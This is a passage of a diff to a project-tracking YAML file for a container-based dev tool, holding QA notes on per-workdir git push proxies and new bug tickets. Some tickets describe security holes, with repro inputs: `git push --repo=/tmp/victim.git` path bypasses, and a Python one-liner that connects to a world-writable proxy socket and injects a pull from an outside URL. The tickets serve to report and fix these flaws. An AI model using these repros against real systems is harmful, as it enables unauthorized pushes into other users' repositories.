+      not affect the containers own /run/pm-push-proxy wrappers. Also pm-dev:latest
+      is not prebuilt - run pm container build-base first (~4 min). Captures: /pm-captures/scenarios/8/{registry-surfaces,pr-notes,container-proxies}.'
+    created_at: '2026-10-28T02:54:22Z'
+    last_edited: '2026-10-28T02:54:22Z'
+  - id: note-67f367f
+    text: 'QA S9 (2026-10-28, container mode, nested podman, real file:// upstream,
+      private PM_TMUX_SOCKET): PASS. Two PRs in one project (pr-7405909 alpha / pr-cb1fbf8
+      beta) each got a distinct workdir-keyed proxy dir /tmp/pm-push-proxy-<tag>-<prid>-<token>;
+      each proxy.json recorded its own workdir+allowed_branch with distinct pids (12984
+      vs 13984); each container mounted its own dir and git ls-remote worked from
+      both. Each push landed only its own branch (upstream tip == that container HEAD,
+      other branch unchanged). Cross-branch push from beta container onto alpha branch
+      exited 1 with the exact message "push-proxy: rejected — pushing to ''pm/pr-7405909-alpha-feature''
+      is not allowed, only ''pm/pr-cb1fbf8-beta-feature''"; neither branch moved;
+      beta proxy kept the same pid/socket and its own push then worked. Restarting
+      alpha impl window recreated its container (new Id/StartedAt) while reusing the
+      same D1 proxy (pid 12984 unchanged, proxy.json unchanged, mount source still
+      D1) and the drive pane printed "PR pr-7405909 is already in_progress, reusing
+      existing workdir."; both containers then pushed only their own branches; beta
+      container Id/StartedAt and proxy untouched. Tests: tests/test_push_proxy.py
+      + tests/test_container.py 238 passed (venv --system-site-packages, pytest<9;
+      reproduction test test_impl_and_qa_get_distinct_proxies passed). Captures: /pm-captures/scenarios/9/{story1-separate-proxies,story2-cross-branch,story3-restart-reuse}.
+      Driver caveats for a re-run: drive container pushes as podman exec $CTR bash
+      -c "cd /workspace && git push ..." (podman exec $CTR git -C /workspace push
+      bypasses the wrapper); keep the project dir name short so the socket dir keeps
+      its readable <tag>-<pr>-<token> form; pipe-pane -o with an already-open pipe
+      is a no-op, so reopen without -o for a second transcript.'
+    created_at: '2026-10-28T02:57:42Z'
+    last_edited: '2026-10-28T02:57:42Z'
+  - id: note-1653ab5
+    text: 'QA S10 (2026-10-28, container mode, nested podman, throwaway file:// fixture):
+      PASS on the workdir-keyed proxy focus. Two containers on one PR workdir shared
+      one socket dir + daemon (impl+review), pushed the same branch concurrently (both
+      rc 0) and a follow-up push advanced upstream; impl + two QA scenario clones
+      each got their own socket dir/daemon (pids 19160/21115/21116) and three simultaneous
+      pushes produced exactly one winner with ordinary git rejections in the two losers;
+      both losers then pull --rebase + push through their unchanged daemons and the
+      branch ends with all three markers. Incidental, out of scope, filed as pr-436d18a:
+      `pm container cleanup --pr <id>` silently removes nothing on podman 3.4.4 (a
+      tab in `podman ps --format` renders as spaces, so the parsed name includes the
+      status; rm fails and is swallowed while the CLI still prints "Removed N"). Also
+      note for future scenario scripts: `git cat-file -e` against the upstream object
+      DB is not a valid "loser commit absent" check (a ref-lock-rejected push has
+      already transferred its objects); use merge-base --is-ancestor against the branch
+      tip, and read refs/remotes/origin/<branch> in a fresh clone, not refs/heads/<branch>.'
+    created_at: '2026-10-28T03:01:24Z'
+    last_edited: '2026-10-28T03:01:24Z'
+  - id: note-a473d00
+    text: 'QA S7 (2026-10-28, container mode, nested podman, real file:// upstream):
+      PASS. R3 reuse verified end-to-end: review and sign-off containers on the PR
+      workdir mount the SAME /run/pm-push-proxy dir as the impl container (proxy.json
+      workdir/allowed_branch/pid and the socket inode all unchanged; exactly one live
+      proxy dir for the PR workdir); closing review+sign-off leaves the shared proxy
+      serving and the impl push lands; reverse order (live QA proxy first, then pm
+      pr start) gives the impl a distinct workdir-keyed dir and leaves the QA proxy
+      pid/inode/mount untouched, with impl then QA pushes each landing on the branch
+      and neither moving the other clone ref. Harness caveats for a re-run: (1) `pm
+      qa run` aborts with INPUT_REQUIRED when the PR has no QA spec and `pm pr spec`
+      generates one via `claude -p` (not allowed here) - seed pm/specs/<pr>/qa.md
+      in the PR workdir instead; (2) with containers the QA scenario container is
+      created BEFORE concretization, so the fake qa_concretize 900 s delay keeps the
+      container live without blocking its appearance; (3) killing an impl window leaves
+      that workdir shared proxy dir+socket in /tmp until `pm session kill` (known
+      cross-process refcount residual, #241/pr-ac12b47), and the dual-remote push
+      target (/tmp/<base>/repo plus the file:// upstream) must both be reset if you
+      rewind a fixture branch between takes or the first push URL rejects non-fast-forward
+      and the container push exits 1. Captures: /pm-captures/scenarios/7/{story1-review-joins,story2-review-relaunch,story3-signoff-joins,story4-stop-review-signoff,story5-reverse-order}.'
+    created_at: '2026-10-28T03:15:47Z'
+    last_edited: '2026-10-28T03:15:47Z'
+  - id: note-eb65472
+    text: 'QA S10 follow-up (2026-10-28): re-ran all three stories with asciinema
+      after the review flagged the missing story-1 capture. Story 1 is now recorded
+      end-to-end in the session ops pane: pm pr start + pm pr review, pm pr show prints
+      Workdir, both containers share one socket dir and pid 11952, the review container
+      makes commit 80b737d, both containers push concurrently (both rc 0, one log
+      says Everything up-to-date), ls-remote rc 0, a follow-up push from impl exits
+      0 with upstream tip == workdir HEAD (aa89358), pid unchanged. Story 2 re-run
+      after resetting the fixture to f4075b6: impl rc 1, qa s1 rc 0, qa s2 rc 1; both
+      losers rejected client-side with (fetch first), so the literal git cat-file
+      -e check holds this time (both loser objects absent, winner present); tip ==
+      qa s1 commit, pre-push commit still an ancestor, losers unreachable, each clone
+      holds only its own commit, all three proxies alive with unchanged pids. Note
+      that the earlier run had a server-side ref-lock rejection, which transfers objects
+      before failing, so cat-file -e is timing-dependent - reachability from the branch
+      is the invariant that matters. The fresh-clone literal check refs/heads/<branch>
+      cannot hold for a normal clone (only the checked-out branch gets a local ref);
+      refs/remotes/origin/<branch> is the correct ref and equals the tip. Captures:
+      /pm-captures/scenarios/10/{story1-shared-proxy,story2-concurrent-push,story3-rebase-recovery},
+      all three with recording.cast + recording.mp4.'
+    created_at: '2026-10-28T03:34:01Z'
+    last_edited: '2026-10-28T03:34:01Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    merge: provider:deepseek-flash
+    signoff: provider:claude-work
 - id: pr-48cb564
   plan: improvements
   title: 'Picker popup: indicate per-session window-selected state with ● vs ○'
@@ -31759,6 +32758,19 @@ prs:
       identity, so restore it after.'
     created_at: '2026-10-27T18:26:14Z'
     last_edited: '2026-10-27T18:26:14Z'
+  - id: note-c902155
+    text: 'Design constraint from pr-748e708 (workdir-keyed push proxies, in review):
+      the proxy now rejects any request whose "workdir" differs from its own workdir
+      (spec R4), and each host workdir gets its own proxy/socket. So the "git proxy
+      forwards pull/fetch/push from any repo to the scenario workdir" bug cannot be
+      fixed by making the wrapper send the container cwd - that request will be rejected
+      with an explicit git-proxy: rejected message. The compatible fix is wrapper-side:
+      only forward to the proxy when the command runs in the mounted repo (/workspace),
+      and otherwise exec real git (which fails cleanly without credentials) or fail
+      with a clear message. Serving arbitrary workdirs per request is the deferred
+      option (3) in pr-748e708 spec. (2026-10-27)'
+    created_at: '2026-10-27T17:08:54Z'
+    last_edited: '2026-10-27T17:08:54Z'
   model: provider:claude-work
   session_models:
     impl: provider:claude-work
@@ -37305,6 +38317,158 @@ prs:
   gh_pr_number: null
   created_at: '2026-10-27T23:16:14.111057+00:00'
   updated_at: '2026-10-27T23:16:14.111057+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-a9803aa
+  plan: bugs
+  title: 'Bug: push proxy local-path origin rejection is bypassed by git push --repo=<path>'
+  branch: pm/pr-a9803aa-bug-push-proxy-local-path-origin-rejection-is-bypa
+  status: pending
+  depends_on: []
+  description: 'pm_core/push_proxy.py `_execute_push` rejects a push whose remote
+    resolves to a local path (fail-closed, since a local-path push would write into
+    another host clone), but the check only inspects the remote named by the first
+    positional arg (default origin). `git push --repo=<path>` names the repository
+    through the option instead, so `_extract_remote_name` returns "origin", `_resolve_local_remote_url(workdir,
+    "origin")` returns None (origin is the real upstream), and `_local_push` then
+    runs `git -C <workdir> push --repo=<path>` as the host user. Verified with git
+    2.34.1: `git push --repo=/tmp/x.git` (no positional) pushes the current branch
+    to that local repo.
+
+
+    Reachability: the in-container ~/.local/bin/git wrapper forwards push/fetch/pull/ls-remote
+    args verbatim to the proxy, so a container process can run `git push --repo=/home/<user>/any/repo`
+    and write the allowed branch into any host local git repo outside its mounted
+    workdir. The allowed-branch restriction still holds; the path restriction does
+    not.
+
+
+    Repro (host): start a proxy for a clone whose origin is a real URL (or mock _resolve_local_remote_url
+    -> None), send {"cmd":"push","args":["--repo=/tmp/victim.git"]}; observe the response
+    runs git push with --repo. Fix idea: treat `--repo`/`--repo=` like the local-path
+    origin check (reject when the named repository is a local path, or reject the
+    option outright since the proxy is origin-scoped).'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T07:45:34.452329+00:00'
+  updated_at: '2026-10-27T08:10:08.615809+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes:
+  - id: note-913e50f
+    text: 'Additional bypass found while reviewing pr-748e708 (2026-10-27): the same
+      local-path-origin rejection is also bypassed by naming the local repository
+      as the *positional remote* instead of `--repo`, e.g. `git push /tmp/victim.git
+      <allowed-branch>` or `git push file:///tmp/victim.git <allowed-branch>`. `_extract_remote_name`
+      returns that string, `_resolve_local_remote_url(workdir, "/tmp/victim.git")`
+      runs `git remote get-url /tmp/victim.git`, which fails (not a configured remote)
+      and returns None, so `_execute_push` treats it as a real remote and `_local_push`
+      runs `git -C <workdir> push /tmp/victim.git ...` on the host. A `file://` URL
+      is also treated as a real remote by the `"://" in url` test in `_resolve_local_remote_url`.
+      Fixing this PR should therefore reject a local path/`file://` URL in the positional
+      remote too, not only `--repo`. The in-container wrapper forwards args verbatim,
+      so both are reachable from a container. Pre-existing on master, unchanged by
+      pr-748e708.'
+    created_at: '2026-10-27T08:10:08Z'
+    last_edited: '2026-10-27T08:10:08Z'
+- id: pr-e618b9c
+  plan: bugs
+  title: 'Push proxy socket is world-connectable: any local user can push/pull as
+    the host user'
+  branch: pm/pr-e618b9c-push-proxy-socket-is-world-connectable-any-local-u
+  status: pending
+  depends_on: []
+  description: 'pm_core/push_proxy.py PushProxy.start() chmods the proxy socket 0o777
+    and the socket directory is created by os.makedirs with the default mode (0755),
+    both under world-writable /tmp (/tmp/pm-push-proxy-*/push.sock). The daemon runs
+    git as the host user with host credentials, so any local user can connect and
+    issue {"cmd":"pull","args":["<url>","<ref>"]} to merge attacker-controlled commits
+    into a served PR worktree, or {"cmd":"push","args":["origin","<allowed-branch>"]}
+    to push to the PR branch as the user. Repro: as another local user, `python3 -c
+    "import socket,json; s=socket.socket(socket.AF_UNIX); s.connect(\"/tmp/pm-push-proxy-<tag>-<pr>-<token>/push.sock\");
+    s.sendall((json.dumps({\"cmd\":\"pull\",\"args\":[\"https://example.com/x.git\",\"main\"]})+\"\n\").encode());
+    print(s.recv(4096))"` while a container proxy is running. Restricted (not fixed)
+    by pr-748e708 spec R4, which now rejects a request naming any workdir other than
+    the proxy own one, so the exposure is limited to the served workdir; the allowed-branch
+    and dangerous-flag checks still apply. Fix direction: stop relying on world-writable
+    /tmp - create the socket root as a 0700 directory (e.g. $XDG_RUNTIME_DIR/pm or
+    ~/.pm/run) with a 0600 socket. The container process runs as the host uid in both
+    supported modes (docker: useradd -u host_uid + exec -u pm; podman: --userns=keep-id),
+    so it does not need world access. That would also retire most of the /tmp squatting/symlink/ownership
+    guards in push_proxy.py. Needs a decision on the container-uid assumption before
+    changing the mode, since a wrong assumption breaks every container push.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T20:41:33.365173+00:00'
+  updated_at: '2026-10-27T20:41:33.365173+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-40c855a
+  plan: bugs
+  title: 'Bug: container-mode launch fails for project dirs with characters podman
+    rejects in names (e.g. [ ])'
+  branch: pm/pr-40c855a-bug-container-mode-launch-fails-for-project-dirs-w
+  status: pending
+  depends_on: []
+  description: 'Location: pm_core/container.py create_container() builds the container
+    name as pm-<session_tag>-impl-<pr_id>; the session tag embeds the repo directory
+    name verbatim (pm_core/paths.py get_session_tag: {dir_name}-{md5[:8]}).
+
+
+    Repro: project dir s6c-[xyz]-long-project-name-forcing-a-hashed-socket-dir with
+    nested_podman: true, container mode enabled and a pm session running. `pm pr start
+    <pr> --background` starts the shared push proxy, then podman create fails: "names
+    must match [a-zA-Z0-9][a-zA-Z0-9_.-]*: invalid argument" (any of [ ] * ? in the
+    dir name). pm surfaces the generic ContainerError "Failed to create container
+    pm-<tag>-impl-<pr>. Is podman running? Disable container mode with ''pm container
+    disable'' to run without containers.", so the real cause is invisible, and the
+    push proxy it started first is left in /tmp until `pm session kill`.
+
+
+    Expected: either sanitize/encode the container name (keeping it unique and mapped
+    back for cleanup/adoption) or fail with an explicit "invalid container name" error
+    before starting the proxy. Scenario 6 story 3 of the pr-748e708 QA run exercises
+    the leftover-proxy cleanup; the naming limitation itself is out of that PR''s
+    scope.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T23:57:02.733584+00:00'
+  updated_at: '2026-10-27T23:57:02.733584+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
+- id: pr-436d18a
+  plan: bugs
+  title: 'Bug: pm container cleanup silently removes nothing on podman 3.x (tab in
+    --format renders as spaces)'
+  branch: pm/pr-436d18a-bug-pm-container-cleanup-silently-removes-nothing-
+  status: pending
+  depends_on: []
+  description: 'Location: pm_core/cli/container.py container_cleanup (lines ~275-300).
+    Repro on podman 3.4.4: `podman ps -a --format "{{.Names}}\t{{.Status}}"` renders
+    the \t as spaces, so `line.split("\t", 1)` never splits and the whole line ("pm-<tag>-impl-<pr>    Up
+    3 minutes ago") is passed to remove_container as the container name. `podman rm
+    -f` then fails with "no container with name or ID ... found", the failure is swallowed
+    (check=False) and the command still prints "Removed N container(s)" while every
+    container keeps running. Observed in QA scenario 10 for pr-748e708: `pm container
+    cleanup --pr pr-ef361dc` reported "Removed 2 container(s)" but both containers
+    were still Up; the debug log (~/.pm/debug/<tag>.log) shows the bogus name in the
+    rm error. Fix: use a delimiter podman actually renders (e.g. {{.Names}}|{{.Status}}
+    or split(None,1)) and count only removals that actually succeeded.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-28T03:01:10.948548+00:00'
+  updated_at: '2026-10-28T03:01:10.948548+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
